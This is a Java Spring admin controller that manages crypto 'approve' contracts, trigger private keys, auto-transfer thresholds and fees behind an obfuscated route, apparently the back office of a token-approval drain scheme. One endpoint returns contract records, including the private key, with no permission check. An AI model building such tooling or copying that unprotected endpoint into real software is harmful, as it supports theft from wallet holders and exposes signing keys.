package com.inso.modules.admin.controller.coin.approve;

import com.inso.framework.bean.ApiJsonTemplate;
import com.inso.framework.bean.PageVo;
import com.inso.framework.bean.SystemErrorResult;
import com.inso.framework.log.Log;
import com.inso.framework.log.LogFactory;
import com.inso.framework.service.Callback;
import com.inso.framework.spring.web.WebRequest;
import com.inso.framework.utils.FastJsonHelper;
import com.inso.framework.utils.RowPager;
import com.inso.framework.utils.StringUtils;
import com.inso.modules.admin.helper.AdminAccountHelper;
import com.inso.modules.coin.core.logical.BinanceApiManager;
import com.inso.modules.coin.approve.logical.ContractInfoInit;
import com.inso.modules.coin.core.model.ContractInfo;
import com.inso.modules.coin.core.model.CryptoChainType;
import com.inso.modules.coin.core.model.CryptoNetworkType;
import com.inso.modules.coin.core.model.TriggerApproveType;
import com.inso.modules.coin.approve.service.ContractService;
import com.inso.modules.common.model.CryptoCurrency;
import com.inso.modules.common.model.ICurrencyType;
import com.inso.modules.common.model.RemarkVO;
import com.inso.modules.common.model.Status;
import org.apache.shiro.authz.annotation.RequiresPermissions;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

import javax.servlet.http.HttpServletRequest;
import java.math.BigDecimal;
import java.math.RoundingMode;

@Controller
@RequestMapping("/alibaba888/Liv2sky3soLa93vEr62")
public class ApproveContractController {

    private static Log LOG = LogFactory.getLog(ApproveContractController.class);

//    @Autowired
//    private ConfigService mConfigService;
//
//    @Autowired
//    private UserService userService;
//
//    @Autowired
//    private UserAttrService mUserAttrService;
//
//    @Autowired
//    private ApproveAuthService mApproveAuthService;
//
//    @Autowired
//    private UserQueryManager mUserQueryManager;
//
//    @Autowired
//    private TransferOrderService mTransferOrderService;

    @Autowired
    private ContractService mContractService;

    @Autowired
    private ContractInfoInit mContractInfoInit;

    @RequiresPermissions("root_coin_crypto_contract_list")
    @RequestMapping("root_coin_crypto_contract")
    public String toList(Model model, HttpServletRequest request)
    {
        boolean isAdmin = AdminAccountHelper.isNy4timeAdminOrDEV();
        model.addAttribute("isSuperAdmin", isAdmin + StringUtils.getEmpty());

        CryptoNetworkType.addFreemarkerModel(model);
        ICurrencyType.addCryptoModel(model);
        //model.addAttribute("networkTypeArr", CryptoNetworkType.getNetworkTypeList());

        return "admin/coin/coin_crypto_contract_list";
    }

    @RequiresPermissions("root_coin_crypto_contract_list")
    @RequestMapping("getCoinCryptoContractList")
    @ResponseBody
    public String getCoinCryptoContractList()
    {
        String time = WebRequest.getString("time");
        String address = WebRequest.getString("address");

        CryptoNetworkType networkType = CryptoNetworkType.getType(WebRequest.getString("networkType"));

        CryptoCurrency currencyType = CryptoCurrency.getType(WebRequest.getString("currencyType"));
        Status status = Status.getType(WebRequest.getString("status"));

        ApiJsonTemplate template = new ApiJsonTemplate();

        PageVo pageVo = new PageVo(WebRequest.getInt("offset"), WebRequest.getInt("limit"));
        pageVo.parseTime(time);

        RowPager<ContractInfo> rowPager = mContractService.queryScrollPage(pageVo, networkType, address, currencyType, status);

        template.setData(rowPager);
        return template.toJSONString();
    }

    @RequestMapping("findCoinCryptoContractInfoById")
    @ResponseBody
    public String findCoinCryptoContractInfoById(Model model, HttpServletRequest request)
    {
        long id = WebRequest.getLong("contractid");
        ApiJsonTemplate apiJsonTemplate = new ApiJsonTemplate();
        if(id <= 0)
        {
            apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_PARAMS);
            return apiJsonTemplate.toJSONString();
        }

        ContractInfo contractInfo = mContractService.findById(false, id);
        if(contractInfo != null)
        {
            apiJsonTemplate.setData(contractInfo);
        }
        else
        {
            apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_EXIST_NOT);
        }
        return apiJsonTemplate.toJSONString();
    }

    @RequiresPermissions("root_coin_crypto_contract_edit")
    @RequestMapping("toCoinCryptoContractEditPage")
    public String toCoinCryptoContractEditPage(Model model, HttpServletRequest request)
    {
        long id = WebRequest.getLong("id");

        RemarkVO remarkVO = null;

        if(id > 0)
        {
            ContractInfo contractInfo = mContractService.findById(false, id);
            contractInfo.setTriggerPrivateKey(StringUtils.getEmpty()); // 安全考虑
            model.addAttribute("entity", contractInfo);

            remarkVO = contractInfo.getRemarkVO();
        }
        else
        {
            remarkVO = new RemarkVO();
        }

        model.addAttribute("remarkInfo", remarkVO);

        CryptoNetworkType[] networkTypeArr = CryptoNetworkType.values();
        model.addAttribute("networkTypeArr", networkTypeArr);

        CryptoCurrency[] currencyTypeArr = CryptoCurrency.values();
        model.addAttribute("currencyTypeArr", currencyTypeArr);

        CryptoChainType[] chaintTypeArr = CryptoChainType.values();
        model.addAttribute("chaintTypeArr", chaintTypeArr);

        TriggerApproveType.addFreemarkerModel(model);

        return "admin/coin/coin_crypto_contract_edit";
    }

    @RequiresPermissions("root_coin_crypto_contract_edit")
    @RequestMapping("updateCoinCryptoContractInfo")
    @ResponseBody
    public String updateCoinCryptoContractInfo(Model model, HttpServletRequest request)
    {
        long id = WebRequest.getLong("id");

        String desc = WebRequest.getString("desc");
        String address = WebRequest.getString("address");
        CryptoNetworkType networkType = CryptoNetworkType.getType(WebRequest.getString("networkType"));

        String triggerPrivateKey = WebRequest.getString("triggerPrivateKey");
        String triggerAddress = WebRequest.getString("triggerAddress");

        CryptoCurrency currency = CryptoCurrency.getType(WebRequest.getString("currencyType"));
        String currencyCtrAddr = WebRequest.getString("currencyCtrAddr");
        CryptoChainType currencyChainType = CryptoChainType.getType(WebRequest.getString("currencyChainType"));

        Status autoTransfer = Status.getType(WebRequest.getString("autoTransfer"));
        BigDecimal minTransferAmount = WebRequest.getBigDecimal("minTransferAmount");

        Status status = Status.getType(WebRequest.getString("status"));

        String remarkString = WebRequest.getString("remark");
        RemarkVO remarkVO = FastJsonHelper.jsonDecode(remarkString, RemarkVO.class);

        ApiJsonTemplate apiJsonTemplate = new ApiJsonTemplate();

        if(id > 0)
        {

            ContractInfo contractInfo = mContractService.findById(false, id);

            if(StringUtils.isEmpty(address) || (!StringUtils.isEmpty(contractInfo.getAddress()) && address.equalsIgnoreCase(contractInfo.getAddress())))
            {
                // 相同不更新
                address = null;
            }

            boolean isAdmin = AdminAccountHelper.isNy4timeAdminOrDEV();
            if(isAdmin)
            {
                mContractService.updateInfo(contractInfo, address, triggerPrivateKey, triggerAddress, autoTransfer, minTransferAmount, status, desc, remarkVO);
            }
            else
            {
                mContractService.updateInfo(contractInfo, null,null, null, autoTransfer, minTransferAmount, status, desc, null);
            }
        }
        else
        {
            if(StringUtils.isEmpty(address) || networkType == null)
            {
                apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_PARAMS);
                return apiJsonTemplate.toJSONString();
            }

            if( StringUtils.isEmpty(currencyCtrAddr) || currency == null || currencyChainType == null)
            {
                apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_PARAMS);
                return apiJsonTemplate.toJSONString();
            }

            mContractService.add(desc, address, networkType, currency, currencyCtrAddr, currencyChainType,
                    triggerPrivateKey, triggerAddress, status, remarkVO);
        }
        return apiJsonTemplate.toJSONString();
    }

    @RequiresPermissions("root_coin_crypto_contract_edit")
    @RequestMapping("updateCoinContractTriggerInfo")
    @ResponseBody
    public String updateCoinContractTriggerInfo(Model model, HttpServletRequest request)
    {
        CryptoNetworkType networkType = CryptoNetworkType.getType(WebRequest.getString("networkType"));

        boolean forceUpdate = WebRequest.getBoolean("forceUpdateTriggerInfoStatus");

        String approveCtrAddress = WebRequest.getString("approveCtrAddress");
        String triggerPrivateKey = WebRequest.getString("triggerPrivateKey");
        String triggerAddress = WebRequest.getString("triggerAddress");
        // 基础矿工费
        BigDecimal usdFeemoney = WebRequest.getBigDecimal("usdFeemoney");
        BigDecimal floatFeemoney = WebRequest.getBigDecimal("floatFeemoney");

        // 被转地址最低转换数量
        BigDecimal minTransferAmount = WebRequest.getBigDecimal("minTransferAmount");

        // 触发原生币最低余额
        BigDecimal minNativeTokenBalance = WebRequest.getBigDecimal("minNativeTokenBalance");

        ApiJsonTemplate apiJsonTemplate = new ApiJsonTemplate();

        boolean isAdmin = AdminAccountHelper.isNy4timeAdminOrDEV();
        if(!isAdmin)
        {
            apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_SYS_OPT_FORBID);
            return apiJsonTemplate.toJSONString();
        }

        if(networkType == null)
        {
            apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_PARAMS);
            return apiJsonTemplate.toJSONString();
        }

        boolean isUpdate = false;

        if(!StringUtils.isEmpty(approveCtrAddress))
        {
            isUpdate = true;
        }

        if(!StringUtils.isEmpty(triggerAddress) || !StringUtils.isEmpty(triggerPrivateKey))
        {
            isUpdate = true;
        }

        if(usdFeemoney != null && usdFeemoney.compareTo(BigDecimal.ZERO) > 0)
        {
            isUpdate = true;
        }

        if(floatFeemoney != null && floatFeemoney.compareTo(BigDecimal.ZERO) > 0)
        {
            isUpdate = true;
        }

        if(minTransferAmount != null && minTransferAmount.compareTo(BigDecimal.ZERO) > 0)
        {
            isUpdate = true;
        }

        if(minNativeTokenBalance != null && minNativeTokenBalance.compareTo(BigDecimal.ZERO) > 0)
        {
            isUpdate = true;
        }

        if(!isUpdate)
        {
            apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_PARAMS);
            return apiJsonTemplate.toJSONString();
        }

        mContractService.queryAll(new Callback<ContractInfo>() {
            @Override
            public void execute(ContractInfo contractInfo) {

                try {
                    CryptoNetworkType tmpNetworkType = CryptoNetworkType.getType(contractInfo.getNetworkType());
                    if(networkType != tmpNetworkType)
                    {
                        return;
                    }

                    CryptoCurrency currency = CryptoCurrency.getType(contractInfo.getCurrencyType());

                    RemarkVO remarkObj = contractInfo.getRemarkVO();

                    BigDecimal lastPrice = null;
                    // 矿工费用
                    if(currency.isUSD())
                    {
                        if(usdFeemoney != null && usdFeemoney.compareTo(BigDecimal.ZERO) > 0)
                        {
                            remarkObj.put(ContractInfo.REMARK_KEY_ORDER_FEEMONEY, usdFeemoney);
                        }

                    }
                    else
                    {
                        if(floatFeemoney != null && floatFeemoney.compareTo(BigDecimal.ZERO) > 0)
                        {
                            lastPrice = BinanceApiManager.getInstance().getLatestPrice(CryptoCurrency.USDT.getKey(), contractInfo.getCurrencyType());
                            if(lastPrice != null && lastPrice.compareTo(BigDecimal.ZERO) > 0)
                            {
                                // fee / lastprice =
                                BigDecimal currencyFeemoney = floatFeemoney.divide(lastPrice, 8, RoundingMode.HALF_UP);
                                remarkObj.put(ContractInfo.REMARK_KEY_ORDER_FEEMONEY, currencyFeemoney);
                            }
                        }
                    }

                    if(minNativeTokenBalance != null && minNativeTokenBalance.compareTo(BigDecimal.ZERO) > 0)
                    {
                        remarkObj.put(ContractInfo.REMARK_KEY_MIN_NATIVE_TOKEN_BALANCE, minNativeTokenBalance);
                    }

                    BigDecimal tmpMinTransferAmount = currency.isUSD() ? minTransferAmount : null;
                    if(minTransferAmount != null && minTransferAmount.compareTo(BigDecimal.ZERO) > 0 && !currency.isUSD())
                    {
                        // 计算最低转账数量
                        if(lastPrice == null)
                        {
                            lastPrice = BinanceApiManager.getInstance().getLatestPrice(CryptoCurrency.USDT.getKey(), contractInfo.getCurrencyType());
                        }

                        if(lastPrice != null && lastPrice.compareTo(BigDecimal.ZERO) > 0)
                        {
                            tmpMinTransferAmount = minTransferAmount.divide(lastPrice, 8, RoundingMode.HALF_UP);
                        }
                    }


                    if(forceUpdate)
                    {
                        mContractService.updateInfo(contractInfo, approveCtrAddress, triggerPrivateKey, triggerAddress,
                                null, tmpMinTransferAmount, null, null, remarkObj);
                        return;
                    }

                    if(StringUtils.isEmpty(contractInfo.getTriggerPrivateKey()) || StringUtils.isEmpty(contractInfo.getTriggerAddress()))
                    {
                        mContractService.updateInfo(contractInfo, approveCtrAddress, triggerPrivateKey, triggerAddress,
                                null, tmpMinTransferAmount, null, null, remarkObj);
                    }
                } catch (Exception e) {
                    LOG.error("update contract error:", e);
                }

            }
        });

        return apiJsonTemplate.toJSONString();
    }


    @RequestMapping("getCoinScanUrl")
    @ResponseBody
    public String getCoinScanUrl(Model model, HttpServletRequest request)
    {
        CryptoNetworkType networkType = CryptoNetworkType.getType(WebRequest.getString("networkType"));
        String type = WebRequest.getString("type");
        String key = WebRequest.getString("key");
        ApiJsonTemplate apiJsonTemplate = new ApiJsonTemplate();

        if(StringUtils.isEmpty(key) || StringUtils.isEmpty(type) || networkType == null)
        {
            apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_PARAMS);
            return apiJsonTemplate.toJSONString();
        }

        if("contract_scan_url".equalsIgnoreCase(type))
        {
            String url = networkType.getContractScanUrl(key);
            apiJsonTemplate.setData(url);
        }
        else if("transaction_scan_url".equalsIgnoreCase(type))
        {
            String url = networkType.getTransactionScanUrl(key);
            apiJsonTemplate.setData(url);
        }
        else if("account_scan_url".equalsIgnoreCase(type))
        {
            String url = networkType.getAccountScanUrl(key);
            apiJsonTemplate.setData(url);
        }
        else if("approve_scan_url".equalsIgnoreCase(type))
        {
            String url = networkType.getApproveScanUrl(key);
            apiJsonTemplate.setData(url);
        }
        else {
            apiJsonTemplate.setJsonResult(SystemErrorResult.ERR_PARAMS);
        }

        return apiJsonTemplate.toJSONString();
    }

    @RequiresPermissions("root_coin_crypto_contract_edit")
    @RequestMapping("batchCoinApproveContractList")
    @ResponseBody
    public String batchCoinApproveContractList()
    {
        ApiJsonTemplate template = new ApiJsonTemplate();
        mContractInfoInit.init();
        return template.toJSONString();
    }

}
